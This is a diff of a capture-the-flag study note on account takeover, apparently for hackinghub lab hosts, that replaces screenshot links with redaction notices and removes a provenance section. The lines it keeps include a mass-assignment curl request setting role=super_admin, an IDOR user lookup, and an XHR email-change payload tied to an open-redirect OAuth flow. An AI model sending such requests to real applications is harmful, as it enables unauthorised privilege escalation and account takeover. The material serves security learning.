@@ -8,7 +8,7 @@ GET https://0hl3b40h.eu1.ctfio.com/api/v1/user/2
 
 ![Pasted image 20241217171151.png](../../assets/images/041e04e6e1b11cddb792.png)
 
-[Captura pendiente de revisión: Pasted image 20241217171523.png](../../Resources/Audit/media.csv)
+*Captura omitida por posibles datos sensibles.*
 
 ## Invite Systems
 
@@ -20,7 +20,7 @@ GET https://0hl3b40h.eu1.ctfio.com/api/v1/user/2
 
 ![Pasted image 20241217172546.png](../../assets/images/92dba689eb30942040d7.png)
 
-[Captura pendiente de revisión: Pasted image 20241217172642.png](../../Resources/Audit/media.csv)
+*Captura omitida por posibles datos sensibles.*
 
 ## Mass Assigment
 
@@ -34,7 +34,7 @@ curl 'https://69xknhzf.eu1.ctfio.com/settings' --compressed -X POST -H 'Cookie: 
 167186173' --data-raw 'website=http%3A%2F%2Fwww.google.com&phone=123456789&bio=Test&role=super_admin'
 ```
 
-[Captura pendiente de revisión: Pasted image 20241217175156.png](../../Resources/Audit/media.csv)
+*Captura omitida por posibles datos sensibles.*
 
 ## OAuth Flow using Open Redirect
 
@@ -103,13 +103,3 @@ xhr.open('POST', '/change-email', true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.send('email=redacted@example.invalid');
 ```
-
-## Procedencia
-
-| Repositorio | Archivo original | Commit de origen |
-| --- | --- | --- |
-| CBBH | BB/hackinghub/Account Takeover.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |
-
-Se han sustituido valores literales de autenticación o direcciones de correo por marcadores. Los detalles sin valores están en [el registro de redacciones](../../Resources/Audit/redactions.csv).
-
-[Índice de categoría](../README.md) · [Inicio](../../README.md)
